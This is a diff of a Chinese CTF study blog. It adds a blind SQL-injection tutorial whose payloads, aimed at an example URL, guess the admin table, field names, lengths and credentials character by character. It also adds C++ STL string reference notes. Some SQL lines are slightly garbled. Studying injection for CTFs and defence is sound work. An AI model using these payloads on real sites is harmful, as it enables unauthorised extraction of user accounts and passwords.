@@ -1,5 +1,172 @@
 # CTF Blog
 
+## 2月27日 更新
+
+### SQL注入 Part 2(约90分)
+
+以 http://www.abc.com/index.php?id=1 为例，分析注入语句
+
+在URL中传递变量id，值为1，后台会进行查询请求
+
+1.判断有无注入点
+```sql
+and 1=1 and 1=2
+and '1'='1' and '1'='2'
+```
+
+2.猜表名，常见的admin, adminuser, user, pass, password等
+
+```sql
+and 0<>(select count(*) from *) 
+and 0<>(select count(*) from admin)
+```
+
+其中第二句指出了判断是否存在admin表
+
+3.猜帐号数目
+
+如果遇到 0<返回正确页面、1<返回错误页面，说明帐号数目就是1个
+```sql
+and 0<(select count(*) from admin) 
+and 1<(select count(*) from admin)
+```
+
+4.猜解字段名称，在len()括号里面加上我们想到的字段名称
+```sql
+and 1=(select count(*) from admin where len(*)>0)-- 
+and 1=(select count(*) from admin where len(用户字段名称)>0) 
+and 1=(select count(*) from admin where len(_blank>密码字段名称)>0)
+```
+
+5.猜解各个字段的长度，猜解长度就是把>0变换，直到返回正确页面为止
+```sql
+and 1=(select count(*) from admin where len(*)>0) 
+and 1=(select count(*) from admin where len(name)>6) -- 错误 
+and 1=(select count(*) from admin where len(name)>5) -- 正确 长度是6 
+and 1=(select count(*) from admin where len(name)=6) -- 正确
+
+and 1=(select count(*) from admin where len(password)>11) // 正确 
+and 1=(select count(*) from admin where len(password)>12) // 错误 长度是12 
+and 1=(select count(*) from admin where len(password)=12) // 正确
+```
+
+6.猜解字符 
+```sql
+and 1=(select count(*) from admin where left(name,1)=a) ---猜解用户帐号的第一位 
+and 1=(select count(*) from admin where left(name,2)=ab)---猜解用户帐号的第二位 
+```
+就这样一次加一个字符这样猜,猜到够你刚才猜出来的多少位了就对了,帐号就算出来了 
+
+7.ASCII逐字解码法的应用
+
+```sql
+and (select count(*) from admin)<>0 --猜解表名
+and (select count(列名) from 表名)<>0 --猜解列名
+and (select len(列名) from 表名)>=1、>=2、>=3、>=4--猜解用户名的长度
+and (select count(*)from 表名 where (asc(mid(列名,1,1))) between 30 and 130)<>0--猜解用户名
+```
+
+### 机试试题 Part 6(约90分)
+
+#### STL String
+
+```cpp
+#include <string>
+using namespace std;
+
+// 构造函数
+string s;
+string s(str);          // 从str中复制
+string s(str, index);   // 部分复制[index,end]
+string s(str, index, n);// 部分复制[index, index + n]
+string s(c_str);        // 从C字符串复制
+string s(c_str, n);     // 从C字符串部分复制[0,n]
+string s(10, 'a');      // 10个'a'
+
+// 长度
+s.empty();              // 判断是否为空
+s.size();
+s.capacity();
+
+// 插入删除
+s.push_back('a');
+s.insert();
+s.erase(start, end);
+s.clear();
+
+// 替换字符
+s.replace();
+s.swap();
+
+// 迭代器
+s.begin();
+s.end();
+s.rend();
+s.rbegin();
+
+// 与C标准字符串转换
+s.c_str();
+s.data();
+
+// 查找
+s.find('a');    // 返回字符所在位置
+
+// 子串
+s.substr(i, j); // [i, j]范围子串
+
+// 比较
+s.compare(str); // 相等0，大于1，小于-1
+```
+
+字符处理
+```cpp
+#include <cctype>
+
+isalnum(c); // 如果c是字母或数字，返回 true
+isalpha(c); // 如果c是字母，返回true
+iscntrl(c); // c是控制符，返回true
+isdigit(c); // 如果c是数字，返回true
+isgraph(c); // 如果c不是空格，则为true
+islower(c); // 如果c是小写字母，则为true
+isupper(c); // 如果c是大写字符，则为true
+isprint(c); // 如果c是可打印的字符，则为true
+ispunct(c); // 如果c是标点符号，则为true
+isspace(c); // 如果c是空白字符，则为true
+isxdigit(c); // 如果c是十六进制数，则为true
+tolower(c); // 如果c是大写字符，则返回其小写字母，否则直接返回c
+toupper(c); // 跟tolower相反
+```
+
+IPv4题目中对IP地址的分段中利用find()和substr()函数可以实现通过关键字符'.'对IP地址进行分段
+
+其他类型与string类型的转换
+
+C++不能直接把int等转换成string 类型，因此需要用sstring 中的字符串输出流来写一个转换string 类型的函数
+
+```cpp
+#include <iostream>
+#include <string>
+#include <sstream>
+using namespace std;
+
+template <class T>
+string toString(const T &t) {
+    ostringstream os;
+    os << t;
+    return os.str();
+}
+
+template <class T>
+T fromString(const string &s) {
+    istringstream is(s);
+    T temp;
+    is >> temp;
+    return temp;
+}
+```
+
+
+
 ## 2月26日 更新
 
 ### SQL 注入 Part 1(约1小时)
